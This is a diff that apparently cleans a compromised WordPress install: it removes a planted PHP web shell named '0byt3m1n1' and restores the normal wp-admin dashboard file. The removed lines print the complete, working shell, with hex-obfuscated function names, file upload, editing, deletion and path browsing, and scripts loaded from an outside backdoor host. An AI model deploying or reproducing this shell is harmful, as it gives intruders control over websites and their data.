@@ -1,180 +1,211 @@
 <?php
+/**
+ * Dashboard Administration Screen
+ *
+ * @package WordPress
+ * @subpackage Administration
+ */
 
-/*
-    0 b y t 3 m 1 n 1 - 2.2
-    Bypass 403 Forbidden / Auto Delete Shell / PHP Malware Detector / Minishell
-*/
+/** Load WordPress Bootstrap */
+require_once __DIR__ . '/admin.php';
 
-set_time_limit(0);
-error_reporting(0);
-error_log(0);
+/** Load WordPress dashboard API */
+require_once ABSPATH . 'wp-admin/includes/dashboard.php';
 
-$sname       = "\x30\x62\x79\x74\x33\x6d\x31\x6e\x31" . "-V2";
-$__gcdir     = "\x67" . "\x65\x74\x63\x77\x64";
-$__fgetcon7s = "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
-$__scdir     = "s" . "\x63\x61\x6e\x64\x69" . "r";
-$rm__dir     = "\x72\x6d\x64" . "ir";
-$un__link    = "\x75\x6e" . "\x6c\x69\x6e\x6b";
+wp_dashboard_setup();
 
-if (get_magic_quotes_gpc()) {
-    foreach ($_POST as $key => $value) {
-        $_POST[$key] = stripslashes($value);
-    }
+wp_enqueue_script( 'dashboard' );
+
+if ( current_user_can( 'install_plugins' ) ) {
+	wp_enqueue_script( 'plugin-install' );
+	wp_enqueue_script( 'updates' );
+}
+if ( current_user_can( 'upload_files' ) ) {
+	wp_enqueue_script( 'media-upload' );
+}
+add_thickbox();
+
+if ( wp_is_mobile() ) {
+	wp_enqueue_script( 'jquery-touch-punch' );
 }
 
-echo '<!DOCTYPE html><html><head><meta name="robots" content"noindex. nofollow"><link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet"><title>'.$sname.'</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><link href="//zerobyte-id.github.io/PHP-Backdoor/inc/m1n1.css" rel="stylesheet" type="text/css"></head><body>';
+// Used in the HTML title tag.
+$title       = __( 'Dashboard' );
+$parent_file = 'index.php';
 
-echo '<div style="color:#ef6c00;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
-if (isset($_GET['path'])) {
-    $path = $_GET['path'];
-    chdir($_GET['path']);
-} else {
-    $path = $__gcdir();
+$help  = '<p>' . __( 'Welcome to your WordPress Dashboard!' ) . '</p>';
+$help .= '<p>' . __( 'The Dashboard is the first place you will come to every time you log into your site. It is where you will find all your WordPress tools. If you need help, just click the &#8220;Help&#8221; tab above the screen title.' ) . '</p>';
+
+$screen = get_current_screen();
+
+$screen->add_help_tab(
+	array(
+		'id'      => 'overview',
+		'title'   => __( 'Overview' ),
+		'content' => $help,
+	)
+);
+
+// Help tabs.
+
+$help  = '<p>' . __( 'The left-hand navigation menu provides links to all of the WordPress administration screens, with submenu items displayed on hover. You can minimize this menu to a narrow icon strip by clicking on the Collapse Menu arrow at the bottom.' ) . '</p>';
+$help .= '<p>' . __( 'Links in the Toolbar at the top of the screen connect your dashboard and the front end of your site, and provide access to your profile and helpful WordPress information.' ) . '</p>';
+
+$screen->add_help_tab(
+	array(
+		'id'      => 'help-navigation',
+		'title'   => __( 'Navigation' ),
+		'content' => $help,
+	)
+);
+
+$help  = '<p>' . __( 'You can use the following controls to arrange your Dashboard screen to suit your workflow. This is true on most other administration screens as well.' ) . '</p>';
+$help .= '<p>' . __( '<strong>Screen Options</strong> &mdash; Use the Screen Options tab to choose which Dashboard boxes to show.' ) . '</p>';
+$help .= '<p>' . __( '<strong>Drag and Drop</strong> &mdash; To rearrange the boxes, drag and drop by clicking on the title bar of the selected box and releasing when you see a gray dotted-line rectangle appear in the location you want to place the box.' ) . '</p>';
+$help .= '<p>' . __( '<strong>Box Controls</strong> &mdash; Click the title bar of the box to expand or collapse it. Some boxes added by plugins may have configurable content, and will show a &#8220;Configure&#8221; link in the title bar if you hover over it.' ) . '</p>';
+
+$screen->add_help_tab(
+	array(
+		'id'      => 'help-layout',
+		'title'   => __( 'Layout' ),
+		'content' => $help,
+	)
+);
+
+$help = '<p>' . __( 'The boxes on your Dashboard screen are:' ) . '</p>';
+
+if ( current_user_can( 'edit_theme_options' ) ) {
+	$help .= '<p>' . __( '<strong>Welcome</strong> &mdash; Shows links for some of the most common tasks when setting up a new site.' ) . '</p>';
 }
-$path  = str_replace("\\", "/", $path);
-$paths = explode("/", $path);
-echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>';
-echo "<font style='font-size:13px;'>Path: ";
-foreach ($paths as $id => $pat) {
-    echo "<a style='font-size:13px;' href='?path=";
-    for ($i = 0; $i <= $id; $i++) {
-        echo $paths[$i];
-        if ($i != $id) {
-            echo "/";
-        }
-    }
-    echo "'>$pat</a>/";
+
+if ( current_user_can( 'view_site_health_checks' ) ) {
+	$help .= '<p>' . __( '<strong>Site Health Status</strong> &mdash; Informs you of any potential issues that should be addressed to improve the performance or security of your website.' ) . '</p>';
 }
-echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#ef6c00;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
-if (isset($_FILES['file'])) {
-    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
-        echo '<center><font color="#00ff00">Upload OK!</font></center><br/>';
-    } else {
-        echo '<center><font color="red">Upload FAILED!</font></center><br/>';
-    }
+
+if ( current_user_can( 'edit_posts' ) ) {
+	$help .= '<p>' . __( '<strong>At a Glance</strong> &mdash; Displays a summary of the content on your site and identifies which theme and version of WordPress you are using.' ) . '</p>';
 }
-echo '</td></tr><tr><td></table><div class="table-div"></div><input id="image" type="hidden">';
-echo '';
-if (isset($_GET['filesrc'])) {
-    echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';
-    echo "" . basename($_GET['filesrc']);
-    "";
-    echo '</tr></td></table><br />';
-    echo ("<center><textarea readonly=''>" . htmlspecialchars($__fgetcon7s($_GET['filesrc'])) . "</textarea></center>");
-} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
-    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
-    if ($_POST['opt'] == 'rename') {
-        if (isset($_POST['newname'])) {
-            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
-                echo '<center><font color="#00ff00">Rename OK!</font></center><br />';
-            } else {
-                echo '<center><font color="red">Rename Failed!</font></center><br />';
-            }
-            $_POST['name'] = $_POST['newname'];
-        }
-        echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" /> <input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
-    } elseif ($_POST['opt'] == 'edit') {
-        if (isset($_POST['src'])) {
-            $fp = fopen($_POST['path'], 'w');
-            if (fwrite($fp, $_POST['src'])) {
-                echo '<center><font color="#00ff00">Edit File OK!.</font></center><br />';
-            } else {
-                echo '<center><font color="red">Edit File Failed!.</font></center><br />';
-            }
-            fclose($fp);
-        }
-        echo '<form method="POST"><textarea cols=80 rows=20 name="src">' . htmlspecialchars($__fgetcon7s($_POST['path'])) . '</textarea><br /><input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';
-    }
-    echo '</center>';
-} else {
-    echo '</table><br /><center>';
-    if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
-        if ($_POST['type'] == 'dir') {
-            if ($rm__dir($_POST['path'])) {
-                echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
-            } else {
-                echo '<center><font color="red">Delete Dir Failed!</font></center><br />';
-            }
-        } elseif ($_POST['type'] == 'file') {
-            if ($un__link($_POST['path'])) {
-                echo '<font color="#00ff00">Delete File Done.</font><br />';
-            } else {
-                echo '<font color="red">Delete File Error.</font><br />';
-            }
-        }
-    }
-    echo '</center>';
-    $_scdir = $__scdir($path);
-    echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"> <th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th> <th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
-    foreach ($_scdir as $dir) {
-        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
-            continue;
-        echo "<tr><td>[D] <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
-        if (is_writable("$path/$dir"))
-            echo '<font color="#00ff00">';
-        elseif (!is_readable("$path/$dir"))
-            echo '<font color="red">';
-        echo perms("$path/$dir");
-        if (is_writable("$path/$dir") || !is_readable("$path/$dir"))
-            echo '</font>';
-        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "";
-        echo "</center></td> <td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
-    }
-    foreach ($_scdir as $file) {
-        if (!is_file("$path/$file"))
-            continue;
-        $size = filesize("$path/$file") / 1024;
-        $size = round($size, 3);
-        if ($size >= 1024) {
-            $size = round($size / 1024, 2) . ' MB';
-        } else {
-            $size = $size . ' KB';
-        }
-        echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>" . $size . "</center></td><td><center>";
-        if (is_writable("$path/$file"))
-            echo '<font color="#00ff00">';
-        elseif (!is_readable("$path/$file"))
-            echo '<font color="red">';
-        echo perms("$path/$file");
-        if (is_writable("$path/$file") || !is_readable("$path/$file"))
-            echo '</font>';
-        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$file")) . "";
-        echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
-    }
-    echo '</table></div>';
+
+$help .= '<p>' . __( '<strong>Activity</strong> &mdash; Shows the upcoming scheduled posts, recently published posts, and the most recent comments on your posts and allows you to moderate them.' ) . '</p>';
+
+if ( is_blog_admin() && current_user_can( 'edit_posts' ) ) {
+	$help .= '<p>' . __( "<strong>Quick Draft</strong> &mdash; Allows you to create a new post and save it as a draft. Also displays links to the 3 most recent draft posts you've started." ) . '</p>';
 }
-function perms($file)
-{
-    $perms = fileperms($file);
-    if (($perms & 0xC000) == 0xC000) {
-        $info = 's';
-    } elseif (($perms & 0xA000) == 0xA000) {
-        $info = 'l';
-    } elseif (($perms & 0x8000) == 0x8000) {
-        $info = '-';
-    } elseif (($perms & 0x6000) == 0x6000) {
-        $info = 'b';
-    } elseif (($perms & 0x4000) == 0x4000) {
-        $info = 'd';
-    } elseif (($perms & 0x2000) == 0x2000) {
-        $info = 'c';
-    } elseif (($perms & 0x1000) == 0x1000) {
-        $info = 'p';
-    } else {
-        $info = 'u';
-    }
-    $info .= (($perms & 0x0100) ? 'r' : '-');
-    $info .= (($perms & 0x0080) ? 'w' : '-');
-    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
-    $info .= (($perms & 0x0020) ? 'r' : '-');
-    $info .= (($perms & 0x0010) ? 'w' : '-');
-    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
-    $info .= (($perms & 0x0004) ? 'r' : '-');
-    $info .= (($perms & 0x0002) ? 'w' : '-');
-    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
-    return $info;
+
+$help .= '<p>' . sprintf(
+	/* translators: %s: WordPress Planet URL. */
+	__( '<strong>WordPress Events and News</strong> &mdash; Upcoming events near you as well as the latest news from the official WordPress project and the <a href="%s">WordPress Planet</a>.' ),
+	__( 'https://planet.wordpress.org/' )
+) . '</p>';
+
+$screen->add_help_tab(
+	array(
+		'id'      => 'help-content',
+		'title'   => __( 'Content' ),
+		'content' => $help,
+	)
+);
+
+unset( $help );
+
+$wp_version = get_bloginfo( 'version', 'display' );
+/* translators: %s: WordPress version. */
+$wp_version_text = sprintf( __( 'Version %s' ), $wp_version );
+$is_dev_version  = preg_match( '/alpha|beta|RC/', $wp_version );
+
+if ( ! $is_dev_version ) {
+	$version_url = sprintf(
+		/* translators: %s: WordPress version. */
+		esc_url( __( 'https://wordpress.org/support/wordpress-version/version-%s/' ) ),
+		sanitize_title( $wp_version )
+	);
+
+	$wp_version_text = sprintf(
+		'<a href="%1$s">%2$s</a>',
+		$version_url,
+		$wp_version_text
+	);
 }
-echo '<br><center>&copy; <span id="footer"></span> 2018.</center><br>';
-echo '<script type="text/javascript" src="//zerobyte-id.github.io/PHP-Backdoor/inc/footer.js"></script>';
-echo '</body></html><!-- EOF -->';
+
+$screen->set_help_sidebar(
+	'<p><strong>' . __( 'For more information:' ) . '</strong></p>' .
+	'<p>' . __( '<a href="https://wordpress.org/support/article/dashboard-screen/">Documentation on Dashboard</a>' ) . '</p>' .
+	'<p>' . __( '<a href="https://wordpress.org/support/">Support</a>' ) . '</p>' .
+	'<p>' . $wp_version_text . '</p>'
+);
+
+require_once ABSPATH . 'wp-admin/admin-header.php';
 ?>
+
+<div class="wrap">
+	<h1><?php echo esc_html( $title ); ?></h1>
+
+	<?php
+	if ( ! empty( $_GET['admin_email_remind_later'] ) ) :
+		/** This filter is documented in wp-login.php */
+		$remind_interval = (int) apply_filters( 'admin_email_remind_interval', 3 * DAY_IN_SECONDS );
+		$postponed_time  = get_option( 'admin_email_lifespan' );
+
+		/*
+		 * Calculate how many seconds it's been since the reminder was postponed.
+		 * This allows us to not show it if the query arg is set, but visited due to caches, bookmarks or similar.
+		 */
+		$time_passed = time() - ( $postponed_time - $remind_interval );
+
+		// Only show the dashboard notice if it's been less than a minute since the message was postponed.
+		if ( $time_passed < MINUTE_IN_SECONDS ) :
+			?>
+		<div class="notice notice-success is-dismissible">
+			<p>
+				<?php
+				printf(
+					/* translators: %s: Human-readable time interval. */
+					__( 'The admin email verification page will reappear after %s.' ),
+					human_time_diff( time() + $remind_interval )
+				);
+				?>
+			</p>
+		</div>
+		<?php endif; ?>
+	<?php endif; ?>
+
+<?php
+if ( has_action( 'welcome_panel' ) && current_user_can( 'edit_theme_options' ) ) :
+	$classes = 'welcome-panel';
+
+	$option = (int) get_user_meta( get_current_user_id(), 'show_welcome_panel', true );
+	// 0 = hide, 1 = toggled to show or single site creator, 2 = multisite site owner.
+	$hide = ( 0 === $option || ( 2 === $option && wp_get_current_user()->user_email !== get_option( 'admin_email' ) ) );
+	if ( $hide ) {
+		$classes .= ' hidden';
+	}
+	?>
+
+	<div id="welcome-panel" class="<?php echo esc_attr( $classes ); ?>">
+		<?php wp_nonce_field( 'welcome-panel-nonce', 'welcomepanelnonce', false ); ?>
+		<a class="welcome-panel-close" href="<?php echo esc_url( admin_url( '?welcome=0' ) ); ?>" aria-label="<?php esc_attr_e( 'Dismiss the welcome panel' ); ?>"><?php _e( 'Dismiss' ); ?></a>
+		<?php
+		/**
+		 * Add content to the welcome panel on the admin dashboard.
+		 *
+		 * To remove the default welcome panel, use remove_action():
+		 *
+		 *     remove_action( 'welcome_panel', 'wp_welcome_panel' );
+		 *
+		 * @since 3.5.0
+		 */
+		do_action( 'welcome_panel' );
+		?>
+	</div>
+<?php endif; ?>
+
+	<div id="dashboard-widgets-wrap">
+	<?php wp_dashboard(); ?>
+	</div><!-- dashboard-widgets-wrap -->
+
+</div><!-- wrap -->
+
+<?php
+wp_print_community_events_templates();
+
+require_once ABSPATH . 'wp-admin/admin-footer.php';
